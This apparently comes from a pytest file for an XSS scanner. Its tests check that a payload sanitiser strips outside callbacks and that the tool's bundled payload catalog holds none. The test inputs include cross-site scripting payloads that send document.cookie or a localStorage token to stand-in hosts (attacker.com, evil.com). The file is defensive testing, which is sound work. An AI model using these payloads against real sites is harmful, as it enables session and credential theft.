"""Payload safety: no third-party callbacks, no live exfiltration."""

from __future__ import annotations

from xoxss.detection.payload import catalog_by_context
from xoxss.scan.safety import (
    SAFE_CALLBACK,
    has_external_callback,
    sanitize_payload,
)


def test_callback_host_is_rewritten() -> None:
    payload = "<img src=x onerror=\"fetch('https://attacker.com/?c='+document.cookie)\">"
    cleaned = sanitize_payload(payload)
    assert "attacker.com" not in cleaned
    assert SAFE_CALLBACK in cleaned
    assert not has_external_callback(cleaned)


def test_cookie_read_is_neutered_only_with_network_sink() -> None:
    exfil = "<script>new Image().src='https://attacker.com/?c='+document.cookie</script>"
    cleaned = sanitize_payload(exfil)
    assert "document.cookie" not in cleaned

    proof = "<script>alert(document.cookie)</script>"
    assert "document.cookie" in sanitize_payload(proof)


def test_storage_read_is_neutered_with_network_sink() -> None:
    payload = "<script>fetch('//evil.com/?t='+localStorage.getItem('token'))</script>"
    cleaned = sanitize_payload(payload)
    assert "evil.com" not in cleaned
    assert "localStorage.getItem" not in cleaned


def test_sanitisation_is_idempotent() -> None:
    payload = "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
    once = sanitize_payload(payload)
    assert sanitize_payload(once) == once


def test_bundled_catalog_has_no_external_callbacks() -> None:
    vectors = catalog_by_context("html")
    assert vectors
    for payload in vectors:
        assert not has_external_callback(payload), payload[:120]
